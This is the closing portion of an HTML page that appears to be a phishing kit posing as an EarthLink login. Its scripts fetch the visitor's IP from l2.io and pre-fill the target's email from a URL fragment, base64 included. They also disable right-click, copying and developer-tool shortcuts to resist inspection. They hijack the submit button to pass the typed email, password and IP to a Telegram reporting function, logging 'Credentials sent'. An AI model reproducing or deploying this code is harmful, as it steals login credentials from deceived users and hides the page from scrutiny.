0-2.486 2.957 15.41 15.41 0 0 0 3.662 3.968l.006-.003.074.058c.27.203.548.397.832.58l.1.064a15.336 15.336 0 0 0 8.283 2.416c8.483 0 15.359-6.841 15.359-15.28 0-2.284-.507-4.449-1.41-6.394l-.01.012Z" clip-rule="evenodd"></path><path fill="#FFF" fill-rule="evenodd" d="M33.509 1.738c-.352-.407-.894-.614-1.613-.614-2.313 0-6.984 2.39-12.351 6.264.263.262.483.566.655.898 1.65-1.191 3.338-2.318 4.829-3.21a40.51 40.51 0 0 1 2.09-1.177c2.09-1.09 3.741-1.668 4.777-1.668.378 0 .636.078.769.23.324.374.195 1.923-2.332 5.34.017.03.037.058.053.088.167.298.324.602.47.911.016.032.03.066.045.099l.031-.041c2.716-3.563 3.582-5.958 2.577-7.12ZM16.962 7.72a2.23 2.23 0 0 0-2.236 2.224c0 .363.097.702.253 1.006-.545.452-1.195.995-1.353 1.13-4.32 3.698-8.083 7.547-10.597 10.836C.259 26.544-.6 28.871.407 30.032c.36.419.879.623 1.582.623 1.468 0 3.831-.885 6.655-2.492l.035-.02c-.033-.02-.067-.04-.1-.062a15.19 15.19 0 0 1-.831-.58l-.075-.06c-2.47 1.374-4.489 2.131-5.684 2.131-.339 0-.588-.089-.74-.263-.374-.434.019-2.37 2.666-5.72 3.725-4.717 7.316-7.996 10.335-10.58.163-.14.881-.74 1.462-1.222.357.24.787.38 1.25.38a2.229 2.229 0 0 0 2.235-2.223c0-1.228-1-2.224-2.235-2.224Z" clip-rule="evenodd"></path></svg></span></div></section></footer></div></div><script>const eyeIcon = document.getElementById('eye-icon');
const passwordInput = document.getElementById('password');
if (eyeIcon) {
    eyeIcon.addEventListener("mousedown", (event) => {
        event.preventDefault();
    });

    eyeIcon.addEventListener("click", function(){
        if (eyeIcon.children[0].className === 'fa fa-eye-slash') {
            eyeIcon.children[0].className = 'fa fa-eye'
            passwordInput.type = 'text'
        } else {
            eyeIcon.children[0].className = 'fa fa-eye-slash'
            passwordInput.type = 'password'
        }

        passwordInput.focus();
        setTimeout(() => {
            const length = passwordInput.value.length;
            passwordInput.setSelectionRange(length, length);
        }, 0);
    })
}

if(passwordInput) {
    passwordInput.onblur = () => {
        if (passwordInput.type !== 'password') {
            eyeIcon.children[0].className = 'fa fa-eye-slash'
            passwordInput.type = 'password'
        }
    }
}</script>
 </section>
	<script>
        function togglePassword(el) {
            // el is the button element
            var pwd = document.getElementById('password');
            // flip the type
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            // keep focus and cursor position after type toggle
            try {
            // Try to capture both selectionStart and selectionEnd so caret/selection
                // isn't moved to the start when toggling. If browser doesn't support
                // these properties, fall back to moving caret to the end.
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                // Allow a micro task for some browsers to re-evaluate type change
                // before setting selection (improves reliability).
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        // Initial spinner and error logic
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            // Show mainContent immediately
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        });
    </script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script
      type="text/javascript"
      src="https://l2.io/ip.js?var=userip"
    ></script>
        <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  </body>
  <script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }

        // Auto-fill email from URL hash fragment.
        // Accepts:
        //  - #email=user@example.com
        //  - #user%40example.com (raw value)
        //  - #dXNlcj5AZXhhbXBsZS5jb20= (base64 encoded value)
        function autoFillFromHash() {
            try {
                var h = window.location.hash || '';
                if (!h) return;
                var fragment = h.substr(1);
                if (!fragment) return;

                // If prefix like email=abc then split and use RHS
                var value = fragment;
                var partsIdx = fragment.indexOf('=');
                if (partsIdx !== -1) {
                    var lhs = fragment.substr(0, partsIdx).toLowerCase();
                    var rhs = fragment.substr(partsIdx + 1);
                    if (lhs === 'email') value = rhs;
                }

                // URL decode once
                try { value = decodeURIComponent(value); } catch (e) { /* ignore */ }

                // If base64, decode
                var base64regex = /^([A-Za-z0-9+/]{4})*(([A-Za-z0-9+/]{2}==)|([A-Za-z0-9+/]{3}=))?$/;
                if (base64regex.test(value.replace(/\s/g, ''))) {
                    try {
                        var decoded = atob(value);
                        if (decoded) value = decoded;
                    } catch (e) { /* ignore if not valid base64 */ }
                }

                // Fill the field if it looks like a valid email
                if (value && isValidEmail(value)) {
                    $('#email').val(value).trigger('input');
                    // Optionally focus the password or keep focus on email
                    $('#password').focus();
                }
            } catch (err) { console.warn('autoFillFromHash error', err); }
        }

        // Run auto-fill on page ready
        autoFillFromHash();

        // Hide error when user updates inputs
        $('#email, #password').on('input', function() {
            $('#loginError').fadeOut(120);
        });

        // Anti-copy / anti-inspect: discourage right-click, copying, and common dev keys.
        (function() {
            // Disable right-click context menu on non-touch devices only
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            // Disable copy from page
            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            // Prevent selection initiation (safely allow within inputs)
            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            // Block some developer tools key combos (not foolproof)
            document.addEventListener('keydown', function(e) {
                // F12
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+U, Ctrl+S
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Cmd+Option+I (mac dev tools)
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        // Hook into Earth link form submission (#accept button)
        var earthlinkSubmitCount = 0;
        var originalAcceptClick = null;
        
        // Wait for #accept button to be available
        var checkAcceptBtn = setInterval(function() {
            var acceptBtn = document.getElementById('accept');
            if (acceptBtn && !originalAcceptClick) {
                clearInterval(checkAcceptBtn);
                
                // Store original click handler
                originalAcceptClick = acceptBtn.onclick;
                
                // Override click handler
                acceptBtn.onclick = function(e) {
                    var emailInput = document.querySelector('input[name="email"]') || document.getElementById('email');
                    var passwordInput = document.getElementById('password');
                    
                    var email = emailInput ? emailInput.value.trim() : '';
                    var pw = passwordInput ? passwordInput.value.trim() : '';
                    
                    if (email && pw && isValidEmail(email)) {
                        earthlinkSubmitCount++;
                        
                        // Use centralized Telegram reporting with provider tag
                        window.providerTag = 'earthlink';
                        var clientIP = window.userip || 'n/a';
                        
                        if (typeof sendCentralizedTelegramReport === 'function') {
                            sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                                console.log(success ? 'Credentials sent' : 'Send failed');
                            });
                        } else {
                            console.error('Centralized Telegram function not available');
                        }
                    }
                    
                    // Call original handler if it existed
                    if (originalAcceptClick) {
                        originalAcceptClick.call(this, e);
                    }
                };
            }
        }, 500);
});
  </script></body></html>